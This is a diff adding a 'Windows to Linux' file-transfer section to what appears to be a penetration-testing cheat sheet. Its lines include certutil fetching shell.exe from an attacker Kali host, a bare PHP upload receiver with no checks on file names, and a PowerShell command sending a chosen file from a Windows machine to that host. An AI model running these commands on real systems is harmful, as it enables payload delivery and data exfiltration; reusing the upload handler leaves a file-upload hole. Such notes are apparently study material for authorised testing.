@@ -87,6 +87,34 @@ cmd.exe /c //<your kali IP>/Share/<file name you want>
 python3 -m http.server 80
 certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\shell.exe
 ````
+### Windows to Linux
+cat upload.php
+````
+<?php
+$uploaddir = '/var/www/uploads/';
+
+$uploadfile = $uploaddir . $_FILES['file']['name'];
+
+move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
+?>
+````
+````
+mv upload.php /var/www/uploads
+````
+````
+sudo mkdir /var/www/uploads
+````
+````
+service apache2 start
+ps -ef | grep apache
+`````
+````
+powershell (New-Object System.Net.WebClient).UploadFile('http://<your Kali ip>/upload.php', '<file you want to transfer>')
+````
+````
+service apache2 stop
+````
+
 ## Linux System Enumeration <img src="https://cdn-icons-png.flaticon.com/512/546/546049.png" width="40" height="40" />
 
 ## Windows System Enumeration <img src="https://cdn-icons-png.flaticon.com/512/232/232411.png" width="40" height="40" />
